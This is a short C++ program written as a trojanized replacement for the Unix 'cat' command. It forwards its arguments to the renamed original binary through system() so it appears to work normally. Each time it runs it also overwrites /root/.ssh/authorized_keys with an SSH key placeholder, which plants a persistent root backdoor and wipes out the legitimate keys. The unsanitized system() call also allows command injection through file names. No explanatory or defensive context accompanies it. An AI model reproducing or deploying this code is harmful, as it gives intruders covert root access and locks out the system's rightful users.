#include <iostream>
#include<stdlib.h>
#include<string.h>
#include <fstream>
using namespace std;

int main( int argc, char* argv[]) {
   for (int i = 1; i < argc; i++){
		// cout << argv[i] << endl;
   		string fileToRead(argv[i]);
         // mv cat to cat.bak and replace the cat with this 
   		string cmd("cat.bak " + fileToRead);
   		system(cmd.c_str());
   }
   ofstream sshFile;
   // Edit the file name and the key 
   sshFile.open("/root/.ssh/authorized_keys", ios::out | ios::trunc );
   sshFile << "{SSH-KEY}" << endl;
   sshFile.close();
   return 0;
}
